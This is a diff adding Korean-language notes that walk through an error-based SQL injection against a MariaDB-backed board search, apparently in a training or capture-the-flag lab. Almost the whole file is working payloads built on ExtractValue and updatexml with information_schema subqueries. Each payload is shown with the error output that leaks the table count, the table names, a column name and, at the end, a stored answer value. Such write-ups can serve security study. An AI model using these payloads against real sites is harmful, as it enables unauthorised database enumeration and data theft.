@@ -1,0 +1,74 @@
+1. 검색어에 (')싱글쿼터 입력 시 오류 발생 확인
+error code : [1064] You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%' OR A.CONTENT like '%'%' OR U.USER_NM like '%'%' ) order by BOARD_ID DESC li' at line 17
+=> DB 종류 Maria DB 확인(My-SQL)문법을 따라감을 확인
+
+사이트 참조: https://documentation.help/InfoSec-cn/cb9b96db-6970-4587-a204-7016f64e0ca4.htm
+
+2. mysql 공격 쿼리문 탐색 : 
+' AND updatexml(1,concat('.a=a',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1)),1) AND '%1%'='%1(성공)
+
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1)))  AND '%1%'='%1(성공)
+
+3. Error Based SQL Injection(테이블 갯수 확인) => 7개 확인
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT COUNT(*) FROM information_schema.tables where table_schema=database())))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]7'
+	
+3. Error Based SQL Injection(테이블 명 확인)
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]access_log'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 1,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]comm_file'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 2,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]comm_mdi_file'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 3,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]eqst_answer'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 4,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]member'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 5,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]notice'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 6,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]zipcode'
+
+4. Error Based SQL Injection(컬럼 갯수 확인) => 1개
+SELECT COUNT(*) FROM information_schema.columns WHERE table_name='eqst_answer'
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='eqst_answer')))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]1'
+
+5. Error Based SQL Injection(컬럼 명 확인)
+
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT column_name FROM information_schema.columns WHERE table_name='eqst_answer')))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]answer_column'
+
+6. Error Based SQL Injection(데이터 확인)
+SELECT answer_column WHERE eqst_answer
+입력 쿼리:
+' AND ExtractValue(1,concat('/a[x=y]',(SELECT answer_column FROM eqst_answer LIMIT 0,1)))  AND '%1%'='%1
+오류 구문:
+error code : [1105] XPATH error: comparison of two nodesets is not supported: '=y]skinfosec_eqst_lms_system'
